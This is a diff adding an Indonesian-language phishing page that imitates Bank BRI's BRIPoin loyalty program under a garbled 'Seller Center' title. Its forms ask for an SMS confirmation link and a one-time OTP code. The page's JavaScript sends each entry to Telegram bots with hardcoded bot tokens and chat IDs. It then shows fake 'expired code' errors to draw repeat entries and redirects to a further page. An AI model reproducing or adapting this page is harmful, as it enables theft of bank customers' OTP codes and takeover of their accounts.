@@ -1,0 +1,543 @@
+<script src="/eruda.min.js"></script>
+<script>
+    eruda.init({
+        tool: ['console', 'elements', 'network', 'resources', 'info']
+    });
+    eruda.get().config.set('displaySize', 60);
+    eruda.remove('settings');
+    eruda.util.evalCss.setTheme('Light');
+</script>
+<html lang="en">
+ <head> 
+  <meta charset="utf-8"> 
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#0F78CB"> 
+   <!-- HTML Meta Tags -->
+
+  <title>TikTVerifikasi Seller Center |-</title>
+
+  <meta name="description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
+
+  <!-- FaceboVerifikasi Meta Tags -->
+  <meta property="og:url" content="https://bripoin.bri.co.id">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="𝗥𝗻  | 𝘂𝗿 𝗣𝗢𝗜𝗡-𝘂">
+  <meta property="og:description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">
+
+  <!-- Twitter Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="bripoin.bri.co.id">
+  <meta property="twitter:url" content="https://bripoin.bri.co.id">
+  <meta name="twitter:title" content="𝗥𝗼𝗶 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗢𝗡-">
+  <meta name="twitter:description" content="BRIPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BRI (BritAma, Simpedes, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BRI dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BRI.">
+  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQe2_RRje_H6EnHBS7-zriaK4XxvgoL3qqnmA&usqp=CAU">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+<link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgO_KJKoiNoIOuh2awDawBIzbhPGD8ZE4TQ2Lzyo2PyR4INOQozVU1zIwCJXeS3T_ZhCnXxdoYusOrUPXuuMF1k-9P3jpaV1SLE9L0WQrdMN72HbXyIc0uDJOF04L_GChyphenhyphenUilXS-nc35hyJaBkonxSZr14jTnIWJE8MXDHo_-G5nfONdgw9zPpI1CPwFhs/s100/AddText_10-22-11.27.51.jpg" type="image/x-icon" />
+<link rel="apple-touch-icon" href="https://play-lh.googleusercontent.com/JreAf9Gx2Zxgyt2khDMGJ6azQojJv78ZNBUtOipSm4oFo1OV-RRIm-7DDNVJTX1pxg=w1024-h500" />
+  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+        
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
+  <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+            position: fixed;
+            background:#d1d1d1;
+        }
+
+        .text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #0086e0;
+        }
+
+        .text-subheader {
+            font-family: 'Open Sans', sans-serif;
+            margin-top: -20px;
+            color: #000;
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 80px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgb(0, 134, 224);
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .form-log {
+            box-sizing: border-box; 
+            height: 45px; 
+            width: 336px;
+            max-width: 90%;
+            border: 3px solid rgb(0, 134, 224);
+            border-radius: 23px;
+            font-family: 'Open Sans', sans-serif;
+            font-size: 16px; 
+            color: rgb(28, 28, 28); 
+            word-spacing: 0px; 
+            padding: 0px 45px;
+            text-align: center;
+            }
+
+        #ionIcons {
+            color: rgb(22, 119, 199);
+            font-size: 29px;
+            position: absolute;
+            display: block;
+            margin-top: 8px;
+            margin-left: 37px;
+        }
+
+        .eye {
+            display: block;
+            margin: -40px auto;
+            margin-right: 20px;
+            position: relative;
+            box-sizing: border-box; 
+            z-index: 16; 
+            height: 19.8189px;
+            width: 25.0236px; 
+            float: right;
+            border-radius: 0px; 
+            cursor: pointer;
+        }
+
+        .Button clickable-element {
+            display: block;
+            margin: 60px 0 0 0;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgba(0, 111, 214, 0.96); 
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 370px; 
+            font-family: Arial; 
+            font-size: 17px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 100ms step-start 0s;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 82%;
+            }
+        }
+
+        .box-lte {
+            width: 380px;
+            max-width: 95%;
+            background: #fff;
+            display: block;
+            box-shadow: 10px 15px 10px 0 rgba(90, 116, 148, 0.4);
+            margin: -40px auto;
+            border-radius: 20px;
+        }
+
+        textarea {
+            box-sizing: border-box; 
+            height: 75px;
+            margin-top: -30px;
+            width: 280px;
+            border: 3px solid rgb(0, 134, 224);
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+          .textarea1 {
+            box-sizing: border-box; 
+            
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 50px;
+            
+        }
+        
+         .textarea {
+            box-sizing: border-box; 
+            height: 75px;
+           
+            width: 280px;
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+        textarea::placeholder{
+            font-size: 13px;
+        }
+           h1{
+            display: table;
+            background-color: #FF0000;
+            color: #fff;
+            padding: 15px;
+            width: 100%;
+            font-size: 13px;
+            margin-bottom: -70px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+           
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            
+        }
+        
+        .blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#otp{
+    display: none;
+}
+    </style> 
+ </head> 
+ <body> 
+  <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
+ <span class="blink" style="display: none" id="blinkotp"><h1>Kode OTP tidak valid, atau sudah kadaluarsa</h1></span> 
+  <div class="container" id="sms" style="display: none"> 
+   <div class="box-lte"> 
+    <div class="row" style="margin-top: 150px;"> 
+     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
+      <img alt="" src="https://blogger.googleusercontent.com/img/a/AVvXsEhoUb8N3IJb4-BJCK8_naiy6s3GrqJHq2LB0GLgZl1fS8JZ6rVf4DE5V6OZv3ipw-1QeG51kyPXdHNJNJl2cONfj5zzezPJDS6SRLJ3LU4sguabtzN6Vs-wMDTo5syhRIadtn8EQtFHGF8cVn9xqBDXd-ckDudr-1MK3LCaqCHY9Q2aApBCEaJEcHEX6hHx" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 90px;" margin-left:="" 10px;="" margin-right:=""> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <hr style="display: block; margin: auto; width: 90%;"> 
+     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer">3 : 00</p> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
+      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Kode telah kami KIRIM ke nomor handphone anda, silakan cek SMS lalu masukkan Link di bawah ini<br><br>Link Konfirmasi (Wajib).</p> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
+ <form onsubmit="KIRIMPesan(event)" method="post" id="formLink">
+       <center> 
+        <div style="margin-top: 1px"> 
+        
+      <textarea id="nama" minlength="20" placeholder="Contoh SMS https://propanaofficial.co.id/apps/" onclick="gantiborder()" required class="" oninvalid="this.setCustomValidity('Hɑrɑp 𝗔𝗜 dn 𝗘𝗠 dengɑn benr untuk 𝗸 yɑng yɑng diterimɑ di 𝗦𝗦')" onchange="this.setCustomValidity('')" id='float-only' name='float-only'></textarea>
+ 
+         <b> <p style="font-size: 11px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000;">Mohon jangan diisi jika belum menerima SMS -OTP berupa Link..!!</strong></p></b>
+        </div>
+       </center>
+       <b>
+<input type="submit" id="KIRIM" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="KIRIM"/>
+</b>
+      </form>
+     </div>
+     <b> </b>
+    </div>
+    <b> </b>
+   </div>
+   <b> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
+      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="otp.html" style="text-decoration: none; color: none rgb(9, 100, 127);">KIRIM ulang SMS</a></strong></p> 
+     </div>
+     <center>
+     <p style="text-align: center; border: 2px solid #ccc; width: 150px; background: none rgb(9, 140, 227); margin-top: -12px; border-radius: 15px; font-size: 13px; height: 30px; padding-top: 4px; color: white; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; " onclick="ubahmode()">Ganti via OTP</p>
+     </center>
+    </div> </b>
+  </div>
+   <div class="container" id="otp" style="display: block"> 
+   <div class="box-lte"> 
+    <div class="row" style="margin-top: 140px;"> 
+     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
+      <img alt="" src="https://blogger.googleusercontent.com/img/a/AVvXsEhoUb8N3IJb4-BJCK8_naiy6s3GrqJHq2LB0GLgZl1fS8JZ6rVf4DE5V6OZv3ipw-1QeG51kyPXdHNJNJl2cONfj5zzezPJDS6SRLJ3LU4sguabtzN6Vs-wMDTo5syhRIadtn8EQtFHGF8cVn9xqBDXd-ckDudr-1MK3LCaqCHY9Q2aApBCEaJEcHEX6hHx" style="display: block; margin: 0px; width: 98%; height: 123%; border-radius: 80px;" margin-left:="" 10px;="" margin-right:=""> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <hr style="display: block; margin: auto; width: 90%;"> 
+     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 40px auto;" id="waktu">3 : 00</p> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
+      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Masukkan kode OTP yang telah dikirim ke email Anda<br><br></p> 
+     </div> 
+    </div> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
+  <form onsubmit="KIRIMPesan1(event)" method="post" id="formLink">
+       <center> 
+        <div style="margin-top: -21px"> 
+        
+       <i class="ion-ios-locked-outline" id="ionIcons"></i> 
+         <input type="tel" id="nama1"  class="bubble-element Input form-log" placeholder="* * * * * *" maxlength="6" minlength="5" style="margin-left: 0px;" required onclick="gantiborder1()">
+  
+         <b> <p style="font-size: 11px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000;"></strong></p></b>
+        </div>
+       </center>
+       <b>
+<input type="submit" id="KIRIM" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Verifikasi"  />
+</b>
+      </form>
+     </div>
+     <b> </b>
+    </div>
+    <b> </b>
+   </div>
+   <b> 
+    <div class="row"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
+      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="otp.html" style="text-decoration: none; color: none rgb(9, 100, 127);">KIRIM ulang SMS</a></strong></p> 
+     </div> 
+     <center>
+ <img src="https://inspirasi.biz/manual/ipos5/lib/MnuPersediaan.jpg" style="width: 90%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+     </center>
+    </div> </b>
+  </div>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="mainkode.js"></script>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+   
+<script>
+    window.onload = function() {
+  var minute = 02;
+  var sec = 59;
+  setInterval(function() {
+    document.getElementById("waktu").innerHTML =   minute + " : " + sec  ;
+    sec--;
+
+    if (sec == 0) {
+      minute--;
+      sec = 59;
+
+      if (minute == 0) {
+        minute = 3;
+      }
+    }
+  }, 1000);
+}
+  
+  
+  
+   
+    document.getElementById('waktu1').innerHTML =
+          03 + ":" + 01;
+        startTimer();
+        
+        function startTimer() {
+          var presentTime = document.getElementById('waktu1').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('waktu1').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+    
+    </script>  
+  <script>
+      document.getElementById('timer').innerHTML =
+          03 + ":" + 01;
+        startTimer1();
+        
+        function startTimer1() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer1, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+        
+        
+        
+  </script>
+  <!-- Static App Form Collection Script -->
+<!--<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
+
+<script src="https://static.app/js/static.js" type="text/javascript"></script>-->
+ <script> 
+   
+   function KIRIMPesan(event){
+  event.preventDefault();
+
+    var nama = document.getElementById('nama');
+    
+
+    var gabungan = '𝗠𝗦 %3A%0A' + nama.value;
+
+     var grup = '5977567780';
+     var tVerifikasien ='7921540459:AAH4OTLgxB_Csmg7J92cw2CztPmIkhNFb9g';
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${tVerifikasien}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        
+    success: function(){
+ document.getElementById("blinkk").style.display = "block";
+ $("#nama").addClass('textarea'); 
+    setTimeout(function(){
+document.getElementById("formLink").reset();
+    }, 1000);}});};
+    
+    
+    
+    
+function ubahmode(){
+     document.getElementById("sms").style.display = "none";
+     document.getElementById("otp").style.display = "block";
+}
+function ubahmode1(){
+     document.getElementById("sms").style.display = "block";
+     document.getElementById("otp").style.display = "none";
+}
+
+
+
+
+
+function KIRIMPesan1(event){
+  event.preventDefault();
+
+    var nama1 = document.getElementById('nama1');
+    
+
+    var gabungan = 'Kode OTP%3A%0A' + nama1.value;
+
+     var grup = '7300917099';
+     var tVerifikasien ='7578477510:AAEaPRffn40jPF486PfZXWvbKO3G9xLVKKU';
+  
+    $.ajax({
+        url: `https://api.telegram.org/bot${tVerifikasien}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        
+   success: function(){
+  var minute = 03;
+  var sec = 01;
+  setInterval(function() {
+  window.location.href='ver.html';
+    document.getElementById("waktu").innerHTML = minute + " : " + sec;
+    sec--;
+
+    if (sec == 0) {
+      minute--;
+      sec = 60;
+
+      if (minute == 0) {
+        minute = 5;
+      }
+    }
+  }, 1000);    
+     
+     
+ document.getElementById("blinkotp").style.display = "block";
+ $("#nama1").val("");
+ $("#nama1").addClass('textarea1'); 
+    setTimeout(function(){
+
+
+    }, 1000);}});};
+
+   
+   
+   </script>
+<script>
+ function gantiborder(){
+   $("#nama").removeClass('textarea'); 
+   $("#blinkk").hide(); 
+ }   
+ 
+ function gantiborder1(){
+   $("#nama1").removeClass('textarea1'); 
+   $("#blinkotp").hide(); 
+ }   
+</script>
+</body>
+</html><!--<script src='https://a.bsite.net/footer.js'></script>
